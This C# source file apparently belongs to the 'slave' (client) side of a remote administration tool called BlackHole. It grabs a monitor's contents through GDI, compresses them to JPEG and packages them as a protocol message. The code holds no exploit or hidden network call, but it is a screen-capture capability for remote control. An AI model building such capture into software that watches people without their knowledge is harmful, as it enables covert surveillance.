﻿using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public static class RemoteDesktopHelper
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="screenNb"></param>
        /// <param name="quality"></param>
        /// <returns></returns>
        public static ScreenCaptureMessage CaptureScreen(int screenNb, int quality)
        {
            var bounds = Screen.AllScreens[screenNb].Bounds;
            var screen = new Bitmap(
                bounds.Width, 
                bounds.Height, 
                PixelFormat.Format32bppPArgb);

            using (var dest = Graphics.FromImage(screen))
            {
                var destPtr = dest.GetHdc();
                var srcPtr = Win32.gdi32_CreateDC("DISPLAY", 
                    null, 
                    null, 
                    IntPtr.Zero);

                Win32.gdi32_BitBlt(destPtr, 
                    0, 
                    0, 
                    bounds.Width, 
                    bounds.Height, 
                    srcPtr, 
                    bounds.X,
                    bounds.Y, 
                    Win32.ROP_COPY);

                Win32.gdi32_DeleteDC(srcPtr);
                dest.ReleaseHdc(destPtr);
            }

            var compressed = CompressImage(screen, quality);
            screen.Dispose();

            return new ScreenCaptureMessage()
            {
                ScreenNumber = screenNb,
                Quality = quality,
                Width = bounds.Width,
                Height = bounds.Height,
                RawImage = compressed
            };
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="image"></param>
        /// <param name="imageQuality"></param>
        /// <returns></returns>
        private static byte[] CompressImage(Bitmap image, int imageQuality)
        {            
            var imageQualitysParameter = new EncoderParameter(
                        System.Drawing.Imaging.Encoder.Quality, imageQuality);
            
            var codecParameter = new EncoderParameters(1);
            codecParameter.Param[0] = imageQualitysParameter;

            var jpegCodec = ImageCodecInfo.GetImageEncoders().First(codec => codec.MimeType == "image/jpeg");

            using (var stream = new MemoryStream())
            {
                image.Save(stream, jpegCodec, codecParameter);
                return stream.ToArray();
            }
        }
    }
}
